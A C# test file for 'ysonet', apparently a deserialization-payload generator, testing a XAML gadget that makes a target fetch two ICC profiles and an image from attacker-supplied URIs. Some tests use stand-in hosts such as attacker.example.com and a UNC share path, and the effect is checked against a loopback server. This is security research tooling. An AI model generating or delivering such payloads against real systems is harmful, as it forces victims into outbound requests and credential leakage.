using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Media;
using ysonet.Generators;
using ysonet.Helpers;
using ysonet.Helpers.Core;
using ysonet.Interactive;

// Tests for the ColorConvertedBitmapExtension gadget.
//
// WHAT THE RUNTIME-EFFECT ROW IS HERE. The payload is one XAML document whose ImageDrawing.ImageSource
// is a ColorConvertedBitmapExtension markup extension. When the product XAML reader evaluates it, it
// calls ProvideValue with a service provider that answers IUriContext, and the extension then issues
// THREE requests: the source ICC profile, the destination ICC profile, and the image. So the sink is
// observed LOCALLY against a test-owned binary HTTP responder on an ephemeral loopback port, which
// records the exact request targets. Nothing leaves the machine.
//
// THE PROFILE FIXTURES ARE MINTED BY THE FRAMEWORK ITSELF, so the row does not depend on a
// machine-installed colour profile: new ColorContext(PixelFormats.Bgra32).OpenProfileStream() hands
// back the standard sRGB profile bytes, which are a valid ICC profile that ColorContext(Uri) parses
// without throwing. That matters because ProvideValue parses the source profile FIRST: an invalid
// profile would throw there and the destination and image requests would never happen, so a row that
// wants to see all three MUST serve a real profile for the first two.
//
// THE GATE IS THE POINT. A markup extension's ProvideValue is called only by a XAML parser, and only a
// XAML parser supplies IUriContext, so this gadget is Xaml-only. The IUriContext control row proves the
// negative directly: constructing the extension and calling ProvideValue with a service provider that
// answers no IUriContext throws before any request, which is exactly why a member-naming format (which
// would construct the extension but never call ProvideValue) reaches nothing.
namespace ysonet.Tests
{
    internal partial class Tests
    {
        private const string CcbGadget = "ColorConvertedBitmapExtension";

        private const string CcbPresentationFramework =
            "PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
        private const string CcbExtensionTypeFullName = "System.Windows.ColorConvertedBitmapExtension";

        private static int _ccbPathCounter;

        // The sRGB profile bytes the framework produces, cached so the effect rows do not re-open a
        // native handle for every cell. A valid ICC profile that ColorContext(Uri) accepts.
        private static byte[] _ccbProfileBytes;
        private static readonly object _ccbProfileLock = new object();

        private static void RunColorConvertedBitmapExtensionTests(TestRunOptions options)
        {
            Run("ColorConvertedBitmapExtension matches the framework contract it depends on",
                ColorConvertedBitmapExtensionMatchesTheFrameworkContract);
            Run("ColorConvertedBitmapExtension generates Xaml only across both minify states",
                ColorConvertedBitmapExtensionGeneratesXamlOnly);
            Run("ColorConvertedBitmapExtension requests three test-owned loopback URLs",
                delegate { ColorConvertedBitmapExtensionRequestsThreeUrls(); });
            Run("ColorConvertedBitmapExtension needs the IUriContext a XAML parser supplies",
                ColorConvertedBitmapExtensionNeedsIUriContext);
            Run("ColorConvertedBitmapExtension carries only its document",
                ColorConvertedBitmapExtensionCarriesOnlyItsDocument);
            Run("ColorConvertedBitmapExtension refuses an unrepresentable triple",
                ColorConvertedBitmapExtensionRefusesUnrepresentableTriples);
            Run("ColorConvertedBitmapExtension resolves nothing at generation time",
                ColorConvertedBitmapExtensionIsNotResolvedAtGenerationTime);
            Run("ColorConvertedBitmapExtension self-tests through the product's own -t",
                delegate { ColorConvertedBitmapExtensionSelfTestFetches(); });
            Run("ColorConvertedBitmapExtension drives the interactive editor correctly",
                ColorConvertedBitmapExtensionEditsInteractively);
            Run("ColorConvertedBitmapExtension declares real facets",
                ColorConvertedBitmapExtensionDeclaresRealFacets);
        }

        // ---- helpers -----------------------------------------------------------

        private static byte[] CcbProfileBytes()
        {
            lock (_ccbProfileLock)
            {
                if (_ccbProfileBytes == null)
                {
                    using (Stream s = new ColorContext(PixelFormats.Bgra32).OpenProfileStream())
                    using (var ms = new MemoryStream())
                    {
                        s.CopyTo(ms);
                        _ccbProfileBytes = ms.ToArray();
                    }
                    // Independently confirm the fixture really is a profile ColorContext accepts, so a
                    // silent framework change cannot turn the effect row into a parse-failure row.
                    AssertTrue(_ccbProfileBytes.Length > 0, "the framework sRGB profile fixture is non-empty");
                }
                return _ccbProfileBytes;
            }
        }

        private static InputArgs CcbInput(string image, string source, string destination, bool minify,
            params string[] extra)
        {
            var ia = new InputArgs { Cmd = image, Test = false, Minify = minify };
            var args = new List<string>
            {
                "--" + ColorConvertedBitmapExtensionGenerator.SourceProfileOptionName, source,
                "--" + ColorConvertedBitmapExtensionGenerator.DestinationProfileOptionName, destination,
            };
            if (extra != null) args.AddRange(extra);
            ia.ExtraArguments = args;
            return ia;
        }

        private static object BuildCcbPayload(InputArgs ia)
        {
            return GadgetRegistry.CreateGadgetInstance(CcbGadget).GenerateWithInit(Formatters.Xaml, ia);
        }

        private static RunResult RunCcb(InputArgs ia)
        {
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = CcbGadget,
                FormatterName = Formatters.Xaml,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        private static string CcbNewPath(string suffix)
        {
            return "/ccb" + Interlocked.Increment(ref _ccbPathCounter) + suffix;
        }

        private static Exception CcbReadOnSta(object payload)
        {
            Exception error = null;
            RunSTA(delegate
            {
                try { PayloadReader.Read(payload, Formatters.Xaml, null); }
                catch (Exception e) { error = e; }
            });
            return error;
        }

        private static string CcbFlatten(Exception e)
        {
            if (e == null) return "<no exception>";
            Exception inner = e;
            while (inner.InnerException != null) inner = inner.InnerException;
            return inner.GetType().Name + ": " + inner.Message;
        }

        private static void CcbAssertThrowsWith(Action action, string needle, string msg)
        {
            string seen = null;
            try { action(); }
            catch (Exception e) { seen = CcbFlatten(e); }
            AssertTrue(seen != null, msg + " (nothing was thrown)");
            AssertTrue(seen != null && seen.IndexOf(needle, StringComparison.OrdinalIgnoreCase) >= 0,
                msg + " (wanted \"" + needle + "\", got \"" + seen + "\")");
        }

        // ---- rows --------------------------------------------------------------

        // Everything the technique needs, asserted from reflection rather than from the header
        // comment: the extension is a markup extension, its one-arg constructor splits on the space,
        // ProvideValue demands IUriContext, and the carrier accepts the value it returns.
        private static void ColorConvertedBitmapExtensionMatchesTheFrameworkContract()
        {
            Type ext = Type.GetType(CcbExtensionTypeFullName + ", " + CcbPresentationFramework, true);
            Type markupExtension = Type.GetType(
                "System.Windows.Markup.MarkupExtension, System.Xaml, Version=4.0.0.0, Culture=neutral, "
                + "PublicKeyToken=b77a5c561934e089", true);
            AssertTrue(markupExtension.IsAssignableFrom(ext),
                "ColorConvertedBitmapExtension is a MarkupExtension, so only a XAML parser calls it");

            ConstructorInfo oneArg = ext.GetConstructor(new[] { typeof(object) });
            AssertTrue(oneArg != null, "it has the single space-delimited (object) constructor");
            AssertTrue(ext.GetMethod("ProvideValue") != null, "and a ProvideValue the parser invokes");

            // The constructor really does split the one string on the space into image / source /
            // destination, which is what makes three explicit inputs deliverable as one argument.
            object built = oneArg.Invoke(new object[] { "IMG SRC DST" });
            AssertEqual("IMG", CcbPrivateField(built, "_image"), "first token is the image");
            AssertEqual("SRC", CcbPrivateField(built, "_sourceProfile"), "second is the source profile");
            AssertEqual("DST", CcbPrivateField(built, "_destinationProfile"),
                "third is the destination profile");

            // The carrier the generator uses accepts what ProvideValue returns:
            // ColorConvertedBitmap : BitmapSource : ImageSource, assigned to ImageDrawing.ImageSource.
            Type imageDrawing = Type.GetType(
                "System.Windows.Media.ImageDrawing, PresentationCore, Version=4.0.0.0, Culture=neutral, "
                + "PublicKeyToken=31bf3856ad364e35", true);
            PropertyInfo imageSource = imageDrawing.GetProperty(
                ColorConvertedBitmapExtensionGenerator.CarrierMemberName);
            AssertTrue(imageSource != null && imageSource.CanWrite,
                "ImageDrawing.ImageSource is a writable public property");
            Type colorConvertedBitmap = Type.GetType(
                "System.Windows.Media.Imaging.ColorConvertedBitmap, PresentationCore, Version=4.0.0.0, "
                + "Culture=neutral, PublicKeyToken=31bf3856ad364e35", true);
            AssertTrue(imageSource.PropertyType.IsAssignableFrom(colorConvertedBitmap),
                "and it accepts the ColorConvertedBitmap the extension returns");

            Type freezable = Type.GetType(
                "System.Windows.Freezable, WindowsBase, Version=4.0.0.0, Culture=neutral, "
                + "PublicKeyToken=31bf3856ad364e35", true);
            AssertTrue(freezable.IsAssignableFrom(imageDrawing),
                "ImageDrawing is a Freezable, so the document builds on any thread");
        }

        private static string CcbPrivateField(object instance, string field)
        {
            FieldInfo fi = instance.GetType().GetField(field,
                BindingFlags.Instance | BindingFlags.NonPublic);
            return fi == null ? null : (string)fi.GetValue(instance);
        }

        private static void ColorConvertedBitmapExtensionGeneratesXamlOnly()
        {
            IGenerator gen = GadgetRegistry.CreateGadgetInstance(CcbGadget);
            AssertTrue(gen != null, "it resolves by name");

            AssertEqual(1, gen.SupportedFormatters().Count, "one formatter only");
            AssertTrue(gen.IsSupported(Formatters.Xaml), "and it is Xaml");
            AssertTrue(gen.Variants() == null || gen.Variants().Count == 0, "no variants");

            foreach (bool minify in new[] { false, true })
            {
                RunResult res = RunCcb(CcbInput("http://h/img", "http://h/src", "http://h/dst", minify));
                AssertTrue(res.Success, "Xaml" + (minify ? " +minify" : "") + " generates: "
                    + res.ErrorMessage);
                AssertTrue(!RawIsEmpty(res.Raw), "payload is not empty");
            }

            // Every other public formatter is refused by name, because only a XAML parser invokes
            // ProvideValue.
            foreach (FieldInfo f in typeof(Formatters).GetFields(BindingFlags.Public | BindingFlags.Static))
            {
                string formatter = (string)f.GetValue(null);
                if (string.IsNullOrEmpty(formatter) || IsFormatterName(formatter, Formatters.Xaml))
                    continue;
                AssertTrue(!gen.IsSupported(formatter), formatter + " is not advertised");
            }

            // A missing profile option is refused, since all three URIs are required.
            var missingSource = new InputArgs { Cmd = "http://h/img", Test = false };
            missingSource.ExtraArguments = new List<string>
            {
                "--" + ColorConvertedBitmapExtensionGenerator.DestinationProfileOptionName, "http://h/dst",
            };
            CcbAssertThrowsWith(() => BuildCcbPayload(missingSource),
                ColorConvertedBitmapExtensionGenerator.SourceProfileOptionName,
                "a missing --source-profile is refused");

            CcbAssertThrowsWith(() => BuildCcbPayload(CcbInput("", "http://h/src", "http://h/dst", false)),
                "non-empty", "an empty image (-c) is refused");
        }

        private static bool IsFormatterName(string a, string b)
        {
            return string.Equals(a, b, StringComparison.OrdinalIgnoreCase);
        }

        // THE runtime-effect row, and the one that earns the version facet.
        //
        // One test-owned binary responder, three run-unique routes (source profile, destination
        // profile, image), the real payload, the reader a target would use on an STA thread, and a
        // requirement that all three owned paths were requested. Nothing leaves the machine.
        private static void ColorConvertedBitmapExtensionRequestsThreeUrls()
        {
            if (!TestEnvironment.CanRun(TestEnvironment.LoopbackTcp,
                "ColorConvertedBitmapExtension loopback fetch"))
                return;

            var failures = new FailureCollector();
            foreach (bool minify in new[] { false, true })
            {
                using (var server = new CcbBinaryServer())
                {
                    string src = CcbNewPath("-src.icc");
                    string dst = CcbNewPath("-dst.icc");
                    string img = CcbNewPath("-img.png");
                    server.Serve(src, CcbProfileBytes(), "application/octet-stream");
                    server.Serve(dst, CcbProfileBytes(), "application/octet-stream");
                    // The image response need not be a valid image: the REQUEST is the effect, and the
                    // decode happens after all three requests have gone out.
                    server.Serve(img, Encoding.ASCII.GetBytes("ysonet-not-an-image"),
                        "application/octet-stream");

                    object payload = BuildCcbPayload(CcbInput(
                        server.UrlFor(img), server.UrlFor(src), server.UrlFor(dst), minify));
                    Exception error = CcbReadOnSta(payload);

                    string cell = "Xaml" + (minify ? " +minify" : "");
                    foreach (var pair in new[] { new[] { "source profile", src }, new[] { "destination profile", dst },
                        new[] { "image", img } })
                    {
                        if (server.WaitForRequest(pair[1], MarkerWaitMs) == null)
                            failures.AddCapability(TestEnvironment.LoopbackTcp, cell,
                                cell + " -> no request for the " + pair[0] + " (" + pair[1]
                                + ") arrived, so the extension did not reach that fetch (reader said: "
                                + CcbFlatten(error) + ")");
                    }
                    if (failures.Count == 0)
                        RuntimeBuild.RecordFired(CcbGadget);
                }
            }

            AssertTrue(failures.Count == 0,
                "ColorConvertedBitmapExtension effect cells failed (" + failures.Count + "):\n  "
                    + string.Join("\n  ", failures.ToArray()));
        }

        // THE GATE, measured in both directions. Without an IUriContext the extension throws before any
        // request; the product reader supplies one, which is the whole reason this is a XAML-only gadget.
        private static void ColorConvertedBitmapExtensionNeedsIUriContext()
        {
            if (!TestEnvironment.CanRun(TestEnvironment.LoopbackTcp,
                "ColorConvertedBitmapExtension IUriContext control"))
                return;

            Type ext = Type.GetType(CcbExtensionTypeFullName + ", " + CcbPresentationFramework, true);

            // Negative: construct the extension by hand and call ProvideValue with a service provider
            // that answers no IUriContext. It must throw naming IUriContext, and make no request.
            using (var server = new CcbBinaryServer())
            {
                string src = CcbNewPath("-src.icc");
                string dst = CcbNewPath("-dst.icc");
                string img = CcbNewPath("-img.png");
                server.Serve(src, CcbProfileBytes(), "application/octet-stream");
                server.Serve(dst, CcbProfileBytes(), "application/octet-stream");
                server.Serve(img, Encoding.ASCII.GetBytes("x"), "application/octet-stream");

                string argument = server.UrlFor(img) + " " + server.UrlFor(src) + " " + server.UrlFor(dst);
                object extension = ext.GetConstructor(new[] { typeof(object) })
                    .Invoke(new object[] { argument });
                MethodInfo provideValue = ext.GetMethod("ProvideValue");

                Exception error = null;
                try { provideValue.Invoke(extension, new object[] { new CcbEmptyServiceProvider() }); }
                catch (TargetInvocationException tie) { error = tie.InnerException ?? tie; }
                catch (Exception e) { error = e; }

                AssertTrue(error != null && CcbFlatten(error).IndexOf("IUriContext",
                        StringComparison.OrdinalIgnoreCase) >= 0,
                    "ProvideValue without IUriContext throws naming IUriContext: " + CcbFlatten(error));
                AssertTrue(server.WaitForRequest(src, 1000) == null,
                    "and it makes no request at all when the context is absent");
            }

            // Positive: the SAME triple through the product XAML reader (which supplies IUriContext)
            // fires. This is what proves the negative above is about the context and not a broken
            // responder.
            using (var server = new CcbBinaryServer())
            {
                string src = CcbNewPath("-src.icc");
                string dst = CcbNewPath("-dst.icc");
                string img = CcbNewPath("-img.png");
                server.Serve(src, CcbProfileBytes(), "application/octet-stream");
                server.Serve(dst, CcbProfileBytes(), "application/octet-stream");
                server.Serve(img, Encoding.ASCII.GetBytes("x"), "application/octet-stream");

                object payload = BuildCcbPayload(CcbInput(
                    server.UrlFor(img), server.UrlFor(src), server.UrlFor(dst), false));
                CcbReadOnSta(payload);
                AssertTrue(server.WaitForRequest(src, MarkerWaitMs) != null,
                    "the product reader supplies IUriContext, so the same triple fires there");
            }
        }

        // The payload is one XAML document: the carrier, the extension, the x:Arguments string, and the
        // three URIs - and it must never name the gadget or the tool.
        private static void ColorConvertedBitmapExtensionCarriesOnlyItsDocument()
        {
            const string img = "http://attacker.example.com/i?a=b&c=d";
            const string src = "http://attacker.example.com/source.icc";
            const string dst = "http://attacker.example.com/destination.icc";

            foreach (bool minify in new[] { false, true })
            {
                string text = (string)BuildCcbPayload(CcbInput(img, src, dst, minify));
                string cell = minify ? "+minify" : "plain";

                AssertTrue(text.IndexOf(ColorConvertedBitmapExtensionGenerator.CarrierElementName,
                        StringComparison.Ordinal) >= 0, cell + ": names the ImageDrawing carrier");
                AssertTrue(text.IndexOf(ColorConvertedBitmapExtensionGenerator.ExtensionElementName,
                        StringComparison.Ordinal) >= 0, cell + ": names the markup extension");
                // The constructor argument travels through x:Arguments. The prefix is asserted by
                // LOCAL NAME, not "x:", because the minifier renames the XAML namespace prefix
                // (x -> a); the target resolves either to the same namespace.
                AssertTrue(text.IndexOf("Arguments", StringComparison.Ordinal) >= 0
                        && text.IndexOf("String", StringComparison.Ordinal) >= 0,
                    cell + ": carries the constructor argument through x:Arguments/x:String");
                AssertTrue(text.IndexOf(ColorConvertedBitmapExtensionGenerator.XamlLanguageNamespace,
                        StringComparison.Ordinal) >= 0,
                    cell + ": and declares the XAML language namespace");
                AssertTrue(text.IndexOf(
                        ColorConvertedBitmapExtensionGenerator.WpfPresentationNamespace,
                        StringComparison.Ordinal) >= 0, cell + ": through the WPF presentation namespace");
                AssertTrue(text.IndexOf("Presentation", StringComparison.Ordinal) < 0
                        || text.IndexOf("PresentationCore", StringComparison.Ordinal) < 0,
                    cell + ": so no PresentationCore/Framework assembly identity is on the wire");

                // The source and destination URIs have no XML-special characters, so they appear
                // verbatim in both minify states.
                foreach (string uri in new[] { src, dst })
                    AssertTrue(text.IndexOf(uri, StringComparison.Ordinal) >= 0,
                        cell + ": carries " + uri);
                // The image URI carries an ampersand. In the plain document it is escaped for XML
                // text as &amp;; the minifier re-serializes and may encode it differently, so the
                // literal form is only asserted on the plain document. That the whole triple
                // (image included) still round-trips under --minify is what the generator's own
                // fidelity guard proves - generation here would have thrown otherwise.
                if (!minify)
                    AssertTrue(text.IndexOf("a=b&amp;c=d", StringComparison.Ordinal) >= 0,
                        cell + ": carries the image URI with its query string, ampersand escaped");

                // The document NECESSARILY contains "ColorConvertedBitmapExtension" - that is the
                // markup-extension element name, which is the whole technique - so unlike a sibling
                // whose gadget name is not a framework type, this one cannot hide it. What it must
                // still never name is the generator CLASS or the tool: those would be a real leak,
                // the type name is not (the seam protects tracked files, not runtime payloads).
                AssertTrue(text.IndexOf("Generator", StringComparison.Ordinal) < 0,
                    cell + ": the payload does not name the generator class");
                AssertTrue(text.IndexOf("ysonet", StringComparison.OrdinalIgnoreCase) < 0,
                    cell + ": nor the tool that built it");
            }
        }

        // The three URIs ARE the payload, so a document that no longer splits into exactly them is
        // refused. A value that cannot be represented (a space, which the ctor splits on) or that XML
        // normalization would rewrite (tab, CR, LF) is refused; an ordinary triple, including query
        // strings, is delivered.
        private static void ColorConvertedBitmapExtensionRefusesUnrepresentableTriples()
        {
            // Ordinary triples, both minify states, deliver.
            foreach (bool minify in new[] { false, true })
            {
                AssertTrue(BuildCcbPayload(CcbInput(
                        "https://attacker.example.com:8443/i?a=b&c=d",
                        "http://attacker.example.com/s.icc",
                        @"\\attacker.example.com\share\d.icc", minify)) != null,
                    "an ordinary triple with a query string and a UNC path is delivered"
                        + (minify ? " with --minify" : ""));
            }

            // A SPACE inside a value cannot be represented: the target's ctor splits the one
            // argument on the space, so a space would create extra tokens.
            CcbAssertThrowsWith(
                () => BuildCcbPayload(CcbInput("http://h/i mg", "http://h/s", "http://h/d", false)),
                "request different locations",
                "a space in the image is refused");
            CcbAssertThrowsWith(
                () => BuildCcbPayload(CcbInput("http://h/i", "http://h/s rc", "http://h/d", false)),
                "request different locations",
                "a space in the source profile is refused");

            // A CARRIAGE RETURN is rewritten by XAML: XML end-of-line handling normalizes CR (and
            // CRLF) to a single LF before the ctor ever sees it, so the target would request a
            // different location. That is a delivery loss, so it is refused.
            CcbAssertThrowsWith(
                () => BuildCcbPayload(CcbInput("http://h/a\rb", "http://h/s", "http://h/d", false)),
                "request different locations",
                "a carriage return is refused because XML normalizes it to a line feed");

            // A TAB and a LINE FEED are NOT rewritten by XML element text (unlike an XML attribute,
            // where normalization turns them into spaces). They round-trip as their own single
            // token, so they are DELIVERED as typed - what the target's own Uri parser then does
            // with them is its decision, which this catalogue documents rather than polices. This is
            // the measured difference between carrying a value in element text and in an attribute.
            foreach (string ok in new[] { "http://h/a\tb", "http://h/a\nb" })
                AssertTrue(BuildCcbPayload(CcbInput(ok, "http://h/s", "http://h/d", false)) != null,
                    "a tab or line feed round-trips through element text and is delivered ("
                        + ok.Replace("\t", "\\t").Replace("\n", "\\n") + ")");

            // --rawinput builds even when the text would not survive, because the operator owns it.
            AssertTrue(BuildCcbPayload(CcbInput("http://h/a\rb", "http://h/s", "http://h/d", false,
                    "--" + ColorConvertedBitmapExtensionGenerator.RawInputOptionName)) != null,
                "--rawinput bypasses the fidelity check");

            // -t is refused BEFORE any request when the triple would be rewritten.
            var lossy = CcbInput("http://h/a\rb", "http://h/s", "http://h/d", false);
            lossy.Test = true;
            RunResult refused = RunCcb(lossy);
            AssertTrue(!refused.Success,
                "a triple XML normalization would rewrite is refused even with -t asked for");
        }

        private static void ColorConvertedBitmapExtensionIsNotResolvedAtGenerationTime()
        {
            if (!TestEnvironment.CanRun(TestEnvironment.LoopbackTcp,
                "ColorConvertedBitmapExtension quiet generation"))
                return;

            using (var server = new CcbBinaryServer())
            {
                string src = CcbNewPath("-src.icc");
                string dst = CcbNewPath("-dst.icc");
                string img = CcbNewPath("-img.png");
                server.Serve(src, CcbProfileBytes(), "application/octet-stream");
                server.Serve(dst, CcbProfileBytes(), "application/octet-stream");
                server.Serve(img, Encoding.ASCII.GetBytes("x"), "application/octet-stream");

                foreach (bool minify in new[] { false, true })
                    AssertTrue(BuildCcbPayload(CcbInput(
                        server.UrlFor(img), server.UrlFor(src), server.UrlFor(dst), minify)) != null,
                        "built a payload" + (minify ? " with --minify" : ""));

                AssertTrue(server.WaitForRequest(src, 750) == null,
                    "generation alone made no request, so -t is the only thing that fetches");
            }
        }

        private static void ColorConvertedBitmapExtensionSelfTestFetches()
        {
            AssertTrue(PayloadReader.CanRead(Formatters.Xaml), "Xaml is a format -t can read back");

            if (!TestEnvironment.CanRun(TestEnvironment.LoopbackTcp,
                "ColorConvertedBitmapExtension -t fetch"))
                return;

            using (var server = new CcbBinaryServer())
            {
                string src = CcbNewPath("-src.icc");
                string dst = CcbNewPath("-dst.icc");
                string img = CcbNewPath("-img.png");
                server.Serve(src, CcbProfileBytes(), "application/octet-stream");
                server.Serve(dst, CcbProfileBytes(), "application/octet-stream");
                server.Serve(img, Encoding.ASCII.GetBytes("ysonet-not-an-image"), "application/octet-stream");

                InputArgs ia = CcbInput(server.UrlFor(img), server.UrlFor(src), server.UrlFor(dst), false);
                ia.Test = true;
                RunResult res = RunCcb(ia);

                AssertTrue(res.Success, "-t completes and still returns a payload: " + res.ErrorMessage);
                AssertTrue(server.WaitForRequest(src, MarkerWaitMs) != null,
                    "-t really requested the source profile from this process, which the help warns about");
            }
        }

        private static void ColorConvertedBitmapExtensionEditsInteractively()
        {
            AssertTrue(Has(new Wizard(null, new MemoryStream(), false).VisibleGadgetNames(), CcbGadget),
                "the wizard offers it with no flag at all");
            AssertTrue(Has(new Wizard(null, new MemoryStream(), true).VisibleGadgetNames(), CcbGadget),
                "and --prv neither hides nor duplicates it");

            var editor = new ModuleEditor(null, null, true, null, null, true);
            var fields = editor.BuildFieldsForTest(CcbGadget);

            AssertTrue(FindEditable(fields, "command") != null, "the editor offers the command setting");
            // The field's LABEL is "test locally", which is what the operator reads. Asking for
            // "test" found nothing and, because the assertion only wanted a non-null field,
            // failed loudly rather than passing silently. Hidden is what actually decides
            // whether the toggle is offered: every gadget has the field in its list.
            EditableField ccbTest = FindEditable(fields, "test locally");
            AssertTrue(ccbTest != null && !ccbTest.Hidden,
                "and the self-test toggle, because -t is accepted");
            AssertTrue(FindEditable(fields,
                    ColorConvertedBitmapExtensionGenerator.SourceProfileOptionName) != null,
                "and the source-profile setting");
            AssertTrue(FindEditable(fields,
                    ColorConvertedBitmapExtensionGenerator.DestinationProfileOptionName) != null,
                "and the destination-profile setting");

            AssertInfoPanelKeepsItsFacts(CcbGadget);
        }

        private static void ColorConvertedBitmapExtensionDeclaresRealFacets()
        {
            IGenerator gen = GadgetRegistry.CreateGadgetInstance(CcbGadget);

            AssertEqual(CommandInputType.Url, gen.CommandInput(), "-c is a URI only the target opens");

            GadgetFacetSet facets = gen.Facets();
            AssertTrue(facets.Kinds.Contains(PayloadKind.Network), "three requests is a network effect");
            AssertTrue(!facets.Kinds.Contains(PayloadKind.Uncategorized), "no uncategorized kind");
            AssertTrue(!facets.Kinds.Contains(PayloadKind.CodeExecution),
                "the responses go to the WIC/ICM parsers, so no code-execution claim");
            AssertTrue(!facets.Kinds.Contains(PayloadKind.InformationDisclosure),
                "nothing is recovered to the operator, so no disclosure claim");
            AssertTrue(!facets.Kinds.Contains(PayloadKind.DenialOfService),
                "native parser exposure is documented, not promoted to DoS");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.BuiltIn), "PresentationFramework ships in-box");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.Wpf), "the carriers are WPF types");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.NetFramework),
                "the family the loopback effect is observed on is declared");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.ModernDotNet),
                "and modern .NET too, measured by the separate net10.0-windows harness");
            AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
                "4.8.1 is the build the loopback fetch is observed on");
            AssertTrue(facets.Versions.Contains(RuntimeVersion.Net100),
                "and 10.0 is the build the net10.0-windows harness observes it on");
            AssertEqual(2, facets.Versions.Count, "two measured endpoints, not a span");

            AssertTrue(gen.Labels().Contains(GadgetTags.Independent), "an independent gadget");
            AssertTrue(gen.AdditionalInfo().IndexOf("documented", StringComparison.OrdinalIgnoreCase) >= 0,
                "and says plainly that the behaviour is documented rather than novel");
        }
    }

    // A test-owned binary HTTP responder on an ephemeral loopback port. The sibling LegacyXmlHttpServer
    // serves TEXT bodies (UTF-8 encoded), which corrupts an ICC profile or image; this one serves raw
    // byte[] bodies, which is what the profile/image requests need. Thread-per-connection, so the three
    // sequential requests one deserialization makes cannot deadlock a serial accept loop.
    internal sealed class CcbBinaryServer : IDisposable
    {
        private readonly TcpListener _listener;
        private readonly Thread _thread;
        private readonly Dictionary<string, byte[]> _routes = new Dictionary<string, byte[]>(StringComparer.Ordinal);
        private readonly Dictionary<string, string> _contentTypes = new Dictionary<string, string>(StringComparer.Ordinal);
        private readonly List<string> _requests = new List<string>();
        private volatile bool _stop;

        public int Port { get; private set; }

        public CcbBinaryServer()
        {
            _listener = new TcpListener(IPAddress.Loopback, 0);
            _listener.Start();
            Port = ((IPEndPoint)_listener.LocalEndpoint).Port;
            _thread = new Thread(AcceptLoop) { IsBackground = true };
            _thread.Start();
        }

        public string UrlFor(string path) { return "http://127.0.0.1:" + Port + path; }

        public void Serve(string path, byte[] body, string contentType)
        {
            lock (_routes)
            {
                _routes[path] = body ?? new byte[0];
                _contentTypes[path] = string.IsNullOrEmpty(contentType) ? "application/octet-stream" : contentType;
            }
        }

        public string[] Requests { get { lock (_requests) return _requests.ToArray(); } }

        public string WaitForRequest(string prefix, int totalMs)
        {
            int waited = 0;
            while (true)
            {
                foreach (string target in Requests)
                    if (target.StartsWith(prefix, StringComparison.Ordinal))
                        return target;
                if (waited >= totalMs) return null;
                Thread.Sleep(50);
                waited += 50;
            }
        }

        private void AcceptLoop()
        {
            try
            {
                while (!_stop)
                {
                    TcpClient client = _listener.AcceptTcpClient();
                    var worker = new Thread(delegate () { Handle(client); }) { IsBackground = true };
                    worker.Start();
                }
            }
            catch { /* Stop() unblocks AcceptTcpClient with an exception */ }
        }

        private void Handle(TcpClient client)
        {
            try
            {
                using (client)
                using (NetworkStream stream = client.GetStream())
                {
                    stream.ReadTimeout = 5000;
                    string requestLine = ReadRequestHead(stream);
                    if (requestLine == null) return;

                    string target = TargetOf(requestLine);
                    lock (_requests) _requests.Add(target);

                    byte[] body;
                    string contentType;
                    bool known;
                    lock (_routes)
                    {
                        known = _routes.TryGetValue(PathOf(target), out body);
                        if (!known || !_contentTypes.TryGetValue(PathOf(target), out contentType))
                            contentType = "application/octet-stream";
                    }
                    if (!known) body = new byte[0];

                    string head = (known ? "HTTP/1.1 200 OK\r\n" : "HTTP/1.1 404 Not Found\r\n")
                        + "Content-Type: " + contentType + "\r\n"
                        + "Content-Length: " + body.Length + "\r\n"
                        + "Connection: close\r\n\r\n";
                    byte[] headBytes = Encoding.ASCII.GetBytes(head);
                    stream.Write(headBytes, 0, headBytes.Length);
                    if (body.Length > 0) stream.Write(body, 0, body.Length);
                    stream.Flush();
                }
            }
            catch { /* a client that hangs up mid-request is not a test failure */ }
        }

        private static string ReadRequestHead(Stream stream)
        {
            var head = new StringBuilder();
            var one = new byte[1];
            while (head.Length < 8192)
            {
                int read = stream.Read(one, 0, 1);
                if (read <= 0) break;
                head.Append((char)one[0]);
                if (head.Length >= 4
                    && head[head.Length - 1] == '\n' && head[head.Length - 2] == '\r'
                    && head[head.Length - 3] == '\n' && head[head.Length - 4] == '\r')
                    break;
            }
            string text = head.ToString();
            int eol = text.IndexOf("\r\n", StringComparison.Ordinal);
            if (eol < 0) return text.Length == 0 ? null : text;
            return text.Substring(0, eol);
        }

        private static string TargetOf(string requestLine)
        {
            string[] parts = requestLine.Split(' ');
            return parts.Length >= 2 ? parts[1] : requestLine;
        }

        private static string PathOf(string target)
        {
            int q = target.IndexOf('?');
            return q < 0 ? target : target.Substring(0, q);
        }

        public void Dispose()
        {
            _stop = true;
            try { _listener.Stop(); } catch { }
        }
    }

    // A service provider that answers NOTHING, used by the IUriContext control row to prove the
    // extension refuses to fetch without the context a XAML parser would supply.
    internal sealed class CcbEmptyServiceProvider : IServiceProvider
    {
        public object GetService(Type serviceType) { return null; }
    }
}
